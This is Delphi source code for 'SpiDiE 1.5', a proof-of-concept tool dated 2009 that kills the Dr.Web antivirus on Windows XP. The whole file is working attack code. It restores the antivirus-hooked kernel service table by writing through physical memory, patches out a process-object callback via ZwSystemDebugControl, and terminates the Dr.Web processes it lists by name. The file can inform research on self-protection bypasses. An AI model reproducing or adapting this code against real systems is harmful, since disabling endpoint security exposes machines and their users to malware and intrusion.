{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows, WinNative, Loader, RTL, Ring0, NtUser, Stub;

implementation

var
  InitSuccess: BOOL = false;

const
  DrWebProcessesMax = 7;
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'drweb32w.exe', 'dwengine.exe', 'drwebupw.exe', 'spiderml.exe', 'spidernt.exe', 'spiderui.exe', 'spidergate.exe', 'spideragent.exe');
  KeServiceDescriptorTable: PAnsiChar = 'KeServiceDescriptorTable';
  SpiDiE_Msg: PWideChar = 'SpiDiE 1.5';
  Str2: PAnsiChar = 'Ура компьютерным вирусам!';

{$R version.res}
type
  _SERVICE_DESCRIPTOR_ENTRY = record
    ServiceTableBase: PPVOID;
    ServiceCounterTableBase: PPVOID; //Used only in checked build
    NumberOfServices: DWORD;
    ParamTableBase: PBYTE;
  end;
  SERVICE_DESCRIPTOR_ENTRY = _SERVICE_DESCRIPTOR_ENTRY;
  PSERVICE_DESCRIPTOR_ENTRY = ^_SERVICE_DESCRIPTOR_ENTRY;

  _DWBUF = array[0..0] of DWORD;
  DWBUF = _DWBUF;
  PDWBUF = ^_DWBUF;

  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

const
  IMAGE_ORDINAL_FLAG32 = $80000000;
  WINXP_SDT_ENTRIES_COUNT = 284;

var
  KernelSize: DWORD;
  KernelBase, pOriginalSDT: PVOID;
  MmSystemRangeStart: Cardinal;

function FindOrigSDT(const pKernel: pointer; kernelBase: DWORD): DWORD;
var
  t: DWORD;
  p1: PChar;
begin
  result := 0;
  t := DWORD(FastGetProcAddress(HINST(pKernel), KeServiceDescriptorTable)) - DWORD(pKernel);
  p1 := pKernel;
  repeat
    if ((PWORD(p1)^ = $05C7) and (PDWORD(p1 + 2)^ = t + kernelBase)) then
    begin
      result := PDWORD(p1 + 6)^ - kernelBase;
      break;
    end;
    inc(p1);
  until false;
end;

function GetKeServiceDescriptorTable(fPtr: PChar): PVOID;
var
  c: DWORD;
begin
  for c := 0 to 4095 do
    if (PWORD(fPtr + c)^ = $888D) then
    begin
      result := PPVOID(fPtr + c + 2)^;
      exit;
    end;
  result := nil;
end;

procedure GetOriginalSystemState();
var
  psdt: PVOID;
  modinf: SYSINFO_BUFFER;
  bytesIO: ULONG;
  textbuf: array[0..MAX_PATH - 1] of WideChar;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(textbuf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(textbuf, '\system32\');
  RtlAnsiToUnicode(strendW(textbuf), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);
  KernelBase := modinf.ModInfo[0].Base;
  pntkernel := PELdrLoadLibrary(textbuf, nil, modinf.ModInfo[0].Base);
  if (pntkernel <> nil) then
  begin
    KernelSize := PEGetVirtualSize(pntkernel);
    psdt := PChar(pntkernel) + FindOrigSDT(pntkernel, DWORD(modinf.ModInfo[0].Base));
    pOriginalSDT := nil;
    bytesIO := WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD);
    ZwAllocateVirtualMemory(NtCurrentProcess, @pOriginalSDT, 0, @bytesIO, MEM_COMMIT or MEM_TOP_DOWN, PAGE_READWRITE);
    memcopy(pOriginalSDT, psdt, WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD));
  end;
end;

function MapPhysMem(hPhyMem: THANDLE; PhyAddr: PDWORD; Length: PDWORD; VirtAddress: PPVOID): PVOID; stdcall;
var
  ViewBase: LARGE_INTEGER;
begin
  VirtAddress^ := nil;
  ViewBase.LowPart := 0;
  ViewBase.HighPart := 0;
  ViewBase.QuadPart := int64(PhyAddr^);
  ZwMapViewOfSection(hPhyMem, NtCurrentProcess, VirtAddress, 0, Length^, @viewBase, Length, ViewShare, 0, PAGE_READWRITE);
  PhyAddr^ := DWORD(viewBase.LowPart);
  result := pointer(viewBase.LowPart);
end;

procedure UnmapPhysMem(VirtualAddr: PVOID);
begin
  ZwUnmapViewOfSection(NtCurrentProcess, VirtualAddr);
end;

var
  PsProcessType: OBJECT_TYPE;

function RemoveDwProtHooks(): boolean;
var
  start: DWORD;
  serviceTable: PDWBUF;
  len, wantedAddr: DWORD;
  ptr, pAddr: PChar;
  hPhysMem: THANDLE;
  p1, sdtAddr: PVOID;
  bytesIO: ULONG;
  Status: NTSTATUS;
  rv: MEMORY_CHUNKS;
  serviceTableAddress: ULONG;
  entries: array[0..3] of SERVICE_DESCRIPTOR_ENTRY;
begin
  result := false;
  GetOriginalSystemState();

  sdtAddr := FastGetProcAddress(HINST(pntkernel), KeServiceDescriptorTable);
  p1 := PChar(sdtAddr) - DWORD(pntkernel) + DWORD(KernelBase) - sizeof(entries);

  if (p1 <> nil) then
  begin
    memzero(@entries, sizeof(entries));
    rv.Address := p1;
    rv.Data := @entries;
    rv.Length := sizeof(entries);
    Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
    if (Status = STATUS_SUCCESS) then
    begin
      hPhysMem := OpenPhysicalMemory(SECTION_MAP_READ or SECTION_MAP_WRITE);
      if (hPhysMem <> 0) then
      begin
        serviceTableAddress := DWORD(entries[0].ServiceTableBase);
        pAddr := PChar(serviceTableAddress) - MmSystemRangeStart;
        wantedAddr := ULONG(pAddr);
        len := PAGE_SIZE;
        if (MapPhysMem(hPhysMem, @pAddr, @len, @ptr) <> nil) then
        begin
          start := wantedAddr - ULONG(pAddr);
          serviceTable := @ptr[start];
          memcopy(serviceTable, pOriginalSDT, sizeof(DWORD) * entries[0].NumberOfServices);
          UnMapPhysMem(ptr);
        end;
        ZwClose(hPhysMem);
      end;
      memzero(@PsProcessType, sizeof(OBJECT_TYPE));
      p1 := PChar(FastGetProcAddress(HINST(pntkernel), 'PsProcessType')) - DWORD(pntkernel) + DWORD(KernelBase);
      rv.Address := p1;
      rv.Data := @p1;
      rv.Length := sizeof(DWORD);
      Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
      if (Status = STATUS_SUCCESS) then
      begin
        rv.Address := p1;
        rv.Data := @PsProcessType;
        rv.Length := sizeof(OBJECT_TYPE);
        Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
        if (Status = STATUS_SUCCESS) then
        begin
          bytesIO := 0;
          rv.Address := pointer(DWORD(p1) + $90); //OpenProcedure removal
          rv.Data := @bytesIO;
          rv.Length := sizeof(DWORD);
          Status := ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
          result := (Status = STATUS_SUCCESS);
        end;
      end;
    end;
  end;
  if (pOriginalSDT <> nil) then
  begin
    bytesIO := 0;
    ZwFreeVirtualMemory(THANDLE(-1), @pOriginalSDT, @bytesIO, MEM_RELEASE);
  end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD; stdcall;
begin
  if InitSuccess then
  begin
    result := MsgBoxW(NtUser_GetDesktopWindow(), PStr, SpiDiE_Msg, Buttons)
  end else
    result := DWORD(-1);
end;

function KillProcess(ProcessId: Cardinal; ExitCode: DWORD = $BADC0DE): boolean; stdcall;
var
  f: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := false;
  cid1.UniqueProcess := ProcessId;
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  f := 0;
  if (ZwOpenProcess(@f, PROCESS_ALL_ACCESS, @attr, @cid1) = STATUS_SUCCESS) then
    if (f <> 0) then
    begin
      result := (ZwTerminateProcess(f, ExitCode) = STATUS_SUCCESS);
      ZwClose(f);
    end;
end;

procedure FindAndKillDwEngine();
var
  pp1: PSYSTEM_PROCESSES;
  membuf: PChar;
  bytesIO: DWORD;
  i: integer;
  buf: LBuf;
begin
  membuf := nil;
  bytesIO := $400000;
  ZwAllocateVirtualMemory(NtCurrentProcess, @membuf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (membuf = nil) then exit;
  if (ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, membuf, bytesIO, @bytesIO) = STATUS_SUCCESS) then
  begin
    pp1 := PSYSTEM_PROCESSES(membuf);
    while (1 = 1) do
    begin
      memzero(@buf, sizeof(LBuf));
      if (pp1^.ProcessName.PStr <> nil) then
        for i := 0 to DrWebProcessesMax do
        begin
          if (strcmpiW(pp1^.ProcessName.PStr, DrWebProcesses[i]) = 0) then
          begin
            if (KillProcess(pp1^.ProcessId, 0)) then
            begin
              strcpyW(buf, '<');
              strcatW(buf, pp1^.ProcessName.PStr);
              strcatW(buf, '> TERMINATED');
              ShowMessage(buf, MB_ICONINFORMATION);
            end else ShowMessage('Damn! Shit happens ><', MB_ICONERROR);
          end;
        end;

      if (pp1^.NextEntryOffset = 0) then break;
      pp1 := PSYSTEM_PROCESSES(PChar(pp1) + pp1^.NextEntryOffset);
    end;
  end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @membuf, @bytesIO, MEM_RELEASE);
end;

function DrWebIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\DwShield');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

procedure main();
begin
  if (ShowMessage('DrWeb5 user mode proof-of-concept killer'#13#10 +
    'DKOH, fucking SSDT / Shadow SSDT will not help DrWeb!'#13#13#10 +
    '(c) 2009 by EP_X0FF'#13#13#10'Should we continue, my friend?', MB_YESNO or MB_ICONQUESTION) = IDNO) then exit;

  if (DrWebIsRunning()) then
  begin
    if (RemoveDwProtHooks()) then
    begin
      FindAndKillDwEngine();
      ShowMessage('That''s all folks! There is no 100% protection / detection / removals levels, only маркетинговый пиздеж',
        MB_ICONINFORMATION);
    end;
  end else
    ShowMessage('Please start DrWeb GUI scanner first to bring here lots of fun! ;)', MB_OK);
end;

var
  osver: OSVERSIONINFOEXW;
  sysinfo: SYSTEM_BASIC_INFORMATION;
  bytesIO: DWORD;
  hUser32: THANDLE;
begin
  hUser32 := 0;
  InitSuccess := InitLoader(@hUser32);
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    ShowMessage('I Need Windows XP ;)', MB_ICONINFORMATION);
  end else
  begin
    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      if (ZwQuerySystemInformation(SystemBasicInformation, @sysinfo, sizeof(SYSTEM_BASIC_INFORMATION), nil) = STATUS_SUCCESS) then
      begin
        MmSystemRangeStart := 1 + sysinfo.HighestUserAddress div $100000;
        MmSystemRangeStart := MmSystemRangeStart * $100000;
      end else MmSystemRangeStart := $80000000;

      main();

      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pntkernel, @bytesIO, MEM_RELEASE);
    end;
  end;
  UnInitLoader();
  ZwTerminateProcess(DWORD(-1), 0);
  asm
    push Str2
  end;
end.

